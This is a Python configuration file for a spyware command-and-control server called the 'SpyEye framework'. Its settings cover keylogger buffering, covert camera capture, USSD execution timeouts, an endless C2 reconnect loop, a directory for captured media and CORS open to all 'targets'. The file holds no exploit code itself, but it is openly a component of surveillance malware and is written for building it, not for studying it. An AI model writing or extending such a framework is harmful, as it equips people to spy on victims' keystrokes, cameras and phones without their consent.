"""
config.py

Centralised configuration for the SpyEye framework.
All sensitive / environment-specific values live here so they can be
tweaked without touching application logic. Designed to seamlessly integrate
with subsequent camera, keylogger, and USSD execution modules.
"""

import os
import secrets
from typing import Dict, Any


class Config:
    """Singleton-style config container (instantiate once, import the instance)."""

    # ─── Flask / SocketIO ────────────────────────────────────────────────
    SECRET_KEY: str = os.getenv("SPYEYE_SECRET_KEY", secrets.token_hex(32))  # CSRF / session key
    HOST: str = os.getenv("SPYEYE_HOST", "0.0.0.0")                          # Listen on all interfaces
    PORT: int = int(os.getenv("SPYEYE_PORT", 5000))
    DEBUG: bool = False                                                     # Production-safe setting
    SOCKETIO_CORS_ALLOWED_ORIGINS: str = "*"                                # Universal multi-target client allowance

    # ─── Database ────────────────────────────────────────────────────────
    DATABASE_PATH: str = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "database.db",
    )
    DATABASE_TRACK_MODIFICATIONS: bool = False

    # ─── Module Timeouts & Buffers ───────────────────────────────────────
    MODULE_STOP_TIMEOUT: float = 3.0                                        # Seconds to wait for thread join
    KEYLOGGER_BUFFER_SIZE: int = 50                                         # Lines before auto-flush via socket (offline persistence buffer)
    CAMERA_CAPTURE_TIMEOUT: int = 10                                        # Seconds to wait for camera frame / live stream sync
    USSD_SESSION_TIMEOUT: int = 45                                          # Max seconds to hold interactive menu state

    # ─── Persistence & Reconnection ─────────────────────────────────────
    PERSISTENCE_SLEEP_INTERVAL: int = 60                                    # Seconds between reconnect attempts
    PERSISTENCE_MAX_RETRIES: int = 0                                        # 0 = infinite retry loop for C2 link

    # ─── Build Metadata & Paths ──────────────────────────────────────────
    FRAMEWORK_NAME: str = "SpyEye Framework"
    FRAMEWORK_VERSION: str = "3.1.0"
    AUTHOR: str = "SpyEye Advanced Core Team"
    CONTACT: str = "https://spyeye.local"                                   # Placeholder C2 domain
    CAPTURED_MEDIA_DIR: str = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "static",
        "captured_media"
    )
    STORAGE_DIR: str = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "storage"
    )

    # ─── Logging ─────────────────────────────────────────────────────────
    LOG_LEVEL: str = "INFO"                                                 # DEBUG, INFO, WARNING, ERROR
    LOG_FORMAT: str = "[%(asctime)s] %(levelname)-8s %(name)s :: %(message)s"

    # ─── Output ──────────────────────────────────────────────────────────
    @classmethod
    def to_dict(cls) -> Dict[str, Any]:
        """Export all uppercase attributes as a dictionary (for API / status endpoints)."""
        return {
            key: getattr(cls, key)
            for key in dir(cls)
            if key.isupper() and not key.startswith("_")
        }


# Single importable instance
config = Config()